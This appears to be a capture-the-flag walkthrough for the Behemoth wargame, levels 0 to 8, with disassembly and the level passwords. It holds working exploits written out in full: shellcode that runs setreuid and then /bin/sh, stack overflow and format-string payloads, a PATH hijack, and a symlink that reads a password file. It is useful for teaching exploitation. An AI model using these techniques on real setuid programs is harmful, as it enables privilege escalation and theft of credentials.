
## level0->level1

Program requires password from stdin.
Strings command does not show correct passwd let's explore in gdb.

```assembly

	   0x565557db <+155>:	push   %eax
	   0x565557dc <+156>:	lea    -0x71(%ebp),%eax
	   0x565557df <+159>:	push   %eax
	   0x565557e0 <+160>:	call   0x56555500 <strcmp@plt>
	   0x565557e5 <+165>:	add    $0x10,%esp
```

See `strcmp`, set bp and check parameters in the stack

```assembly
	   (gdb) x/2wx 0xffffd5d0
	   0xffffd5d0:	0xffffd5e7	0xffffd628
	   (gdb) x/s 0xffffd628
	   0xffffd628:	"eatmyshorts"
	   (gdb)
```

##### pass=aesebootiv


------------------------------------------------------------------------------------------------------------------------------------


## level1->level2

Dump of assembler code for function main:
```assembly
   0x565555d0 <+0>:	lea    0x4(%esp),%ecx
   0x565555d4 <+4>:	and    $0xfffffff0,%esp
   0x565555d7 <+7>:	pushl  -0x4(%ecx)
   0x565555da <+10>:	push   %ebp
   0x565555db <+11>:	mov    %esp,%ebp
   0x565555dd <+13>:	push   %ebx
   0x565555de <+14>:	push   %ecx
=> 0x565555df <+15>:	sub    $0x50,%esp
   0x565555e2 <+18>:	call   0x565554a0 <__x86.get_pc_thunk.bx>
   0x565555e7 <+23>:	add    $0x1325,%ebx
   0x565555ed <+29>:	sub    $0xc,%esp
   0x565555f0 <+32>:	lea    -0x125c(%ebx),%eax
   0x565555f6 <+38>:	push   %eax
   0x565555f7 <+39>:	call   0x56555410 <printf@plt>
   0x565555fc <+44>:	add    $0x10,%esp
   0x565555ff <+47>:	sub    $0xc,%esp
   0x56555602 <+50>:	lea    -0x4b(%ebp),%eax
   0x56555605 <+53>:	push   %eax
   0x56555606 <+54>:	call   0x56555420 <gets@plt>
   0x5655560b <+59>:	add    $0x10,%esp
   0x5655560e <+62>:	sub    $0xc,%esp
   0x56555611 <+65>:	lea    -0x1250(%ebx),%eax
   0x56555617 <+71>:	push   %eax
   0x56555618 <+72>:	call   0x56555430 <puts@plt>
   0x5655561d <+77>:	add    $0x10,%esp
   0x56555620 <+80>:	mov    $0x0,%eax
   0x56555625 <+85>:	lea    -0x8(%ebp),%esp
   0x56555628 <+88>:	pop    %ecx
   0x56555629 <+89>:	pop    %ebx
   0x5655562a <+90>:	pop    %ebp
   0x5655562b <+91>:	lea    -0x4(%ecx),%esp
   0x5655562e <+94>:	ret
```
After made a copy of suid program in tmp directory, I executed it several time in order to check if somethings can be overflowed.

Gets function it's vulnerable and after some attempt it was very simple to discover that I can overwrite RA with value I want.

So the idea was to put shellcode that executes:
* `setreuid(behemoth2uid)` 
* `execve(/bin/sh)`

Some nops help us to write the correct value in the stack frame.

```assembly
#behemoth2 = 13002
.text
.global _start
_start:
    xorl    %ebx,%ebx
    xorl    %ecx,%ecx
    xorl    %eax,%eax
    xorl    %edi,%edi
    movw    $0x32CA,%bx
    movw    $0x32CA,%cx
    movb    $0x46,%al
    int     $0x80
    xorl    %edx,%edx
    xorl    %ebx,%ebx
    xorl    %ecx,%ecx
    xorl    %eax,%eax
    movb    $0xB,%al
    movl    $0xffffffcc,%ebx
    int     $0x80

```
```bash
$ (python -c 'print "\x41\xd6\xff\xff"*5+"\x31\xdb\x31\xc9\x31\xc0\x31\xff\x66\xbb\xca\x32\x66\xb9\xca\x32\xb0\x46\xcd\x80\x31\xd2\x31\xdb\x31\xc9\x31\xc0\xb0\x0b\xbb\x79\xd6\xff\xff\xcd\x80"+"aa"+"\x39\xd6\xff\xff"*4+"////////////bin/sh"';cat) | ./behemoth1
```

I inserted cat instruction maintain the pipe open

##### pass=eimahquuof

------------------------------------------------------------------------------------------------------------------------------------

## level2->level3

```assembly
000006f0 <main>:
 6f0:	8d 4c 24 04          	lea    0x4(%esp),%ecx
 6f4:	83 e4 f0             	and    $0xfffffff0,%esp
 6f7:	ff 71 fc             	pushl  -0x4(%ecx)
 6fa:	55                   	push   %ebp
 6fb:	89 e5                	mov    %esp,%ebp
 6fd:	56                   	push   %esi
 6fe:	53                   	push   %ebx
 6ff:	51                   	push   %ecx
 700:	81 ec 8c 00 00 00    	sub    $0x8c,%esp
 706:	e8 b5 fe ff ff       	call   5c0 <__x86.get_pc_thunk.bx>
 70b:	81 c3 f5 18 00 00    	add    $0x18f5,%ebx
 711:	e8 fa fd ff ff       	call   510 <getpid@plt>
 716:	89 45 e4             	mov    %eax,-0x1c(%ebp)
 719:	8d 45 cc             	lea    -0x34(%ebp),%eax
 71c:	83 c0 06             	add    $0x6,%eax
 71f:	89 45 e0             	mov    %eax,-0x20(%ebp)
 722:	83 ec 04             	sub    $0x4,%esp
 725:	ff 75 e4             	pushl  -0x1c(%ebp)
 728:	8d 83 a0 e8 ff ff    	lea    -0x1760(%ebx),%eax
 72e:	50                   	push   %eax
 72f:	8d 45 cc             	lea    -0x34(%ebp),%eax
 732:	50                   	push   %eax
 733:	e8 18 fe ff ff       	call   550 <sprintf@plt>
 738:	83 c4 10             	add    $0x10,%esp
 73b:	83 ec 08             	sub    $0x8,%esp
 73e:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
 744:	50                   	push   %eax
 745:	ff 75 e0             	pushl  -0x20(%ebp)
 748:	e8 13 01 00 00       	call   860 <__lstat>
 74d:	83 c4 10             	add    $0x10,%esp
 750:	25 00 f0 00 00       	and    $0xf000,%eax
 755:	3d 00 80 00 00       	cmp    $0x8000,%eax
 75a:	74 36                	je     792 <main+0xa2>
 75c:	83 ec 0c             	sub    $0xc,%esp
 75f:	ff 75 e0             	pushl  -0x20(%ebp)
 762:	e8 99 fd ff ff       	call   500 <unlink@plt>
 767:	83 c4 10             	add    $0x10,%esp
 76a:	e8 81 fd ff ff       	call   4f0 <geteuid@plt>
 76f:	89 c6                	mov    %eax,%esi
 771:	e8 7a fd ff ff       	call   4f0 <geteuid@plt>
 776:	83 ec 08             	sub    $0x8,%esp
 779:	56                   	push   %esi
 77a:	50                   	push   %eax
 77b:	e8 b0 fd ff ff       	call   530 <setreuid@plt>
 780:	83 c4 10             	add    $0x10,%esp
 783:	83 ec 0c             	sub    $0xc,%esp
 786:	8d 45 cc             	lea    -0x34(%ebp),%eax
 789:	50                   	push   %eax
 78a:	e8 91 fd ff ff       	call   520 <system@plt>
 78f:	83 c4 10             	add    $0x10,%esp
 792:	83 ec 0c             	sub    $0xc,%esp
 795:	68 d0 07 00 00       	push   $0x7d0
 79a:	e8 41 fd ff ff       	call   4e0 <sleep@plt>
 79f:	83 c4 10             	add    $0x10,%esp
 7a2:	8d 45 cc             	lea    -0x34(%ebp),%eax
 7a5:	c7 00 63 61 74 20    	movl   $0x20746163,(%eax)
 7ab:	c6 40 04 00          	movb   $0x0,0x4(%eax)
 7af:	c6 45 d0 20          	movb   $0x20,-0x30(%ebp)
 7b3:	e8 38 fd ff ff       	call   4f0 <geteuid@plt>
 7b8:	89 c6                	mov    %eax,%esi
 7ba:	e8 31 fd ff ff       	call   4f0 <geteuid@plt>
 7bf:	83 ec 08             	sub    $0x8,%esp
 7c2:	56                   	push   %esi
 7c3:	50                   	push   %eax
 7c4:	e8 67 fd ff ff       	call   530 <setreuid@plt>
 7c9:	83 c4 10             	add    $0x10,%esp
 7cc:	83 ec 0c             	sub    $0xc,%esp
 7cf:	8d 45 cc             	lea    -0x34(%ebp),%eax
 7d2:	50                   	push   %eax
 7d3:	e8 48 fd ff ff       	call   520 <system@plt>
 7d8:	83 c4 10             	add    $0x10,%esp
 7db:	b8 00 00 00 00       	mov    $0x0,%eax
 7e0:	8d 65 f4             	lea    -0xc(%ebp),%esp
 7e3:	59                   	pop    %ecx
 7e4:	5b                   	pop    %ebx
 7e5:	5e                   	pop    %esi
 7e6:	5d                   	pop    %ebp
 7e7:	8d 61 fc             	lea    -0x4(%ecx),%esp
 7ea:	c3                   	ret
 7eb:	66 90                	xchg   %ax,%ax
 7ed:	66 90                	xchg   %ax,%ax
 7ef:	90                   	nop
```
The interesting part of this assembly code is that a program performs a setreuid call to have suid permission and then calls `system('touch pid')` followed by a call to sleep function.

I focused on system libc call, because there is no specified absolute path of command and the program does not clear the env variables.

So I exported PATH putting a tmp directory in which I create `touch` program that simply do a `system` on `/bin/bash`.

Then I called behemoth2 program and I obtained suid shell.

`export PATH=/tmp/bbbb:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games`

##### pass=nieteidiel

------------------------------------------------------------------------------------------------------------------------------------


## level3->level4


We can perform here format string attack.
To do that i copied behemoth3 in a tmp dir just to see the core dumps.
I created a program called `com` that simply performed a system to `/bin/sh`.
You can call system directly in the shellcode with `/bin/sh` as argument but I do that just to check if the setreuid call is persistent.

Now my exploit code:

```assembly
.text
.global _start
_start:
    jmp string
prot:
    xorl    %esi,%esi
    popl    %esi
    xorl    %ebx,%ebx
    xorl    %ecx,%ecx
    xorl    %eax,%eax
    xorl    %edi,%edi
    movw    $0x32CC,%bx
    movw    $0x32CC,%cx
    movb    $0x46,%al
    int     $0x80
    xorl    %edx,%edx
    xorl    %ebx,%ebx
    xorl    %ecx,%ecx
    xorl    %eax,%eax
    movb    $0xB,%al
    movl    %esi,%ebx
    int     $0x80
    xorl    %eax,%eax
    inc     %eax                
    xor     %ebx, %ebx              
    int     $0x80
string:
	call prot
	p: .ascii "/////////////////////////tmp/2222/com"
```

As first step I loaded shellcode in an env variable called `SHELLCODE`.

```bash
$ export SHELLCODE=$(python -c 'print "\x90"*34+"\xeb\x2c\x31\xf6\x5e\x31\xdb\x31\xc9\x31\xc0\x31\xff\x66\xbb\xcc\x32\x66\xb9\xcc\x32\xb0\x46\xcd\x80\x31\xd2\x31\xdb\x31\xc9\x31\xc0\xb0\x0b\x89\xf3\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xcf\xff\xff\xff\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x74\x6d\x70\x2f\x32\x32\x32\x32\x2f\x63\x6f\x6d"')
```


Then in core dump i see that RA is stored in 0xffffd60c, so with format string (direct parameter access) I overwrite that stack address with shellcode loaded in env.


```bash
$ (python -c 'print "\x0c\xd6\xff\xff"+"\x0d\xd6\xff\xff"+"\x0e\xd6\xff\xff"+"\x0f\xd6\xff\xff"+"%20x%6$n"+"aa"+"%184x%7$n"+"%33x%8$n"+"%9$n"';cat)| ./behemoth3
```

##### pass=ietheishei


------------------------------------------------------------------------------------------------------------------------------------

## level4->level5

With ltrace I discovered that the program open file called `/tmp/pid_of_process`.
So the programs open that file read the content and prompt it.
The only things to do here is to guess the pid of launched process, and that was quite simple with strace.
I created a link to a flag file, in `tmp` directory, with `$PIDGUESSED` name.
so before call behemoth4:

```bash
$ ln -s /etc/behemoth_pass/behemoth5 /tmp/20548
```
And now we have the flag


##### pass=aizeeshing

------------------------------------------------------------------------------------------------------------------------------------


## level5->level6


With strace I was able to know that the program failed after open because tries to open flag file, and with strace call it cannot take suid privileges.

So I created in tmp directory a copy of suid program.
Then touch a fake flag and edit the bytecode to make it the new flag file.


Now we can with strace try to analyze what happen:
```c
__libc_start_main(0x565558c0, 1, 0xffffd724, 0x56555ad0 <unfinished ...>
fopen("//////////tmp/bbbb/behemoth6", "r")                                                                    = 0x56558008
fseek(0x56558008, 0, 2, 0x565558d7)                                                                           = 0
ftell(0x56558008, 0, 2, 0x565558d7)                                                                           = 24
rewind(0x56558008, 0, 2, 0x565558d7)                                                                          = 0xfbad2488
malloc(25)                                                                                                    = 0x56559170
fgets("flag{ciao_sono_la_flag}\n", 25, 0x56558008)                                                            = 0x56559170
strlen("flag{ciao_sono_la_flag}\n")                                                                           = 24
fclose(0x56558008)                                                                                            = 0
gethostbyname("localhost")                                                                                    = 0xf7fc7960
socket(2, 2, 0)                                                                                               = 3
atoi(0x56555b94, 2, 0, 0x565558d7)                                                                            = 1337
htons(1337, 2, 0, 0x565558d7)                                                                                 = 0x3905
memset(0xffffd650, '\0', 8)                                                                                   = 0xffffd650
strlen("flag{hi_i'm_the_flag}\n")                                                                           = 24
sendto(3, 0x56559170, 24, 0)                                                                                  = 24
close(1448411136)                                                                                             = 0
exit(1448411136 <no return ...>
+++ exited (status 0) +++
```
so we have data send to created udp socket(SOCK_DGRAM) with 1337 port, the next step is to create a simple udp server that creates udp socket bind with that port and listen incoming connections to print out the data.
```python
import socket
port = 1337
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(("", port))
print "waiting on port:", port
while 1:
        data, addr = s.recvfrom(1024)
        print(data)
```
and it must run in background
```bash
$ python exp.py &
```
then run suid program and the flag is printed out by the python script.


##### pass=mayiroeche

------------------------------------------------------------------------------------------------------------------------------------

## level6->level7


The suid program call behemoth6_reader file and execute a file called `shellcode.txt` withouth specifing absolute path.
So the idea is to export `PATH` with `/behemoth` directory and execute the program in a tmp dir with `shellcode.txt`.
Then I copied `behemote6` and `behemote6_reader` in `tmp` directory to know how the programs works.
I realized that `behemoth6_reader` executes what is in `shellcode.txt` and behemoth6 compare what prompt `behemoth6_reader` with string `HelloKitty`, so I created PIC code that prompt `HelloKitty`.

After that I executed suid program.

Here's the code:

```assembly
.text
.global _start
_start:
    jmp string
    #movl    $len,%edx
    #movl    $msg,%ecx
prot:
	xorl %eax,%eax
	inc %eax
	inc %eax
	inc %eax
	inc %eax
	xorl %ebx,%ebx
	inc %ebx
	xorl %edx,%edx
	movb $0xa,%dl
	pop %ecx
	int     $0x80
	xorl %eax,%eax
	inc %eax              
    xor %ebx, %ebx              
    int  $0x80
string:
	call prot
	p: .ascii "HelloKitty"
```
```bash
$ export PATH=$PATH:/behemoth
```
```bash
$ python -c 'print "\xeb\x17\x31\xc0\x40\x40\x40\x40\x31\xdb\x43\x31\xd2\xb2\x0a\x59\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x48\x65\x6c\x6c\x6f\x4b\x69\x74\x74\x79"'>shellcode.txt
```
```bash
$ behemoth6
```



##### pass=baquoxuafo

------------------------------------------------------------------------------------------------------------------------------------

## level7->level8


The program clears all env variables, and clearly takes something as argument.
Let's explore:

If you pass as argument a string it will call `__ctype_b_loc` for every char, in order to check if a shellcode is passed.
Fortunatley that check is only for the firts 512 chars, after that we can put what we want (pay attention to space chars).

```assembly
 0x565557d1 <+289>:	je     0x565557e0 <main+304>
 0x565557d3 <+291>:	cmpl   $0x1ff,-0x24(%ebp)			# Here the cmp instruction, after that we have strcpy. 
 0x565557da <+298>:	jle    0x5655574f <main+159>
 0x565557e0 <+304>:	mov    0x4(%esi),%eax
 0x565557e3 <+307>:	add    $0x4,%eax
 0x565557e6 <+310>:	mov    (%eax),%eax
 0x565557e8 <+312>:	sub    $0x8,%esp
 0x565557eb <+315>:	push   %eax
 0x565557ec <+316>:	lea    -0x224(%ebp),%eax
 0x565557f2 <+322>:	push   %eax
 0x565557f3 <+323>:	call   0x565554c0 <strcpy@plt>
 ```

So this is the shellcode:

```assembly
.text
.global _start
_start:
    jmp string
prot:
    xorl    %esi,%esi
    popl    %esi
    xorl    %ebx,%ebx
    xorl    %ecx,%ecx
    xorl    %eax,%eax
    xorl    %edi,%edi
    movw    $0x32D0,%bx
    movw    $0x32D0,%cx
    movb    $0x46,%al
    int     $0x80
    xorl    %edx,%edx
    xorl    %ebx,%ebx
    xorl    %ecx,%ecx
    xorl    %eax,%eax
    movb    $0xB,%al
    movl    %esi,%ebx
    int     $0x80
    xorl 	%eax,%eax
	inc 	%eax                
    xor     %ebx, %ebx             
    int     $0x80
string:
	call prot
	p: .ascii "///////////////////////////////bin/sh"
```
And here the final exploit
```bash
./behemoth7 $(python -c 'print "a"*536+"\xf0\xd3\xff\xff"+"\xff\xd3\xff\xff"+"\x90"*16+"\xeb\x2c\x31\xf6\x5e\x31\xdb\x31\xc9\x31\xc0\x31\xff\x66\xbb\xd0\x32\x66\xb9\xd0\x32\xb0\x46\xcd\x80\x31\xd2\x31\xdb\x31\xc9\x31\xc0\xb0\x0b\x89\xf3\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80\xe8\xcf\xff\xff\xff\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x2f\x62\x69\x6e\x2f\x73\x68"')
```

##### pass=pheewij7Ae
